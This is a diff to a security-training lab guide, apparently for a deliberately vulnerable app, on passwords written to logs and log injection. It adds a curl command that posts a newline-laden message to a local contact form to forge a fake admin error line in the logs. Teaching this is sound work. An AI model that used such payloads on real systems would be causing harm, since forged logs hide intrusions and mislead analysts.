@@ -1,10 +1,10 @@
 # Lab 10: Secrets in logs + log injection
 
-The login handler prints username **and password** to the log on every attempt, and the username is interpolated raw — so a newline in the input forges log lines.
+The login handler and the contact form print user input to the log raw — so a password lands in the log, and a newline in the input forges log lines.
 
 **OWASP Top 10:2025:** [A09 Security Logging and Monitoring Failures](https://owasp.org/Top10/2025/)
 
-**Code:** `routes/auth.js` (`console.log` in `/login/auth`)
+**Code:** `routes/auth.js` (`console.log` in `/login/auth`), `routes/pages.js` (`console.log` in `/contact`)
 
 ## Exploit 1: password in logs
 
@@ -30,8 +30,18 @@ docker compose logs web | grep -A1 "login attempt user=alice"
 # [auth] login attempt user=alice
 # [2026-09-07 12:00:00] ERROR fake-critical-event user=admin action=disable-2fa password=wrong
 ```
-
 A fake log entry an analyst would treat as real — planted evidence, alert pollution, or hiding real activity in the noise.
+
+The same works from the public **Contact** page — no login required:
+
+```bash
+curl -s -X POST http://localhost:8888/contact -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "email=a@b.com" --data-urlencode $'hello\n[2026-09-07 12:00:00] ERROR fake-critical-event user=admin'
+
+docker compose logs web | grep -A1 "\[contact\]"
+# [contact] from=a@b.com message=hello
+# [2026-09-07 12:00:00] ERROR fake-critical-event user=admin
+```
 
 ## Why it happens
 
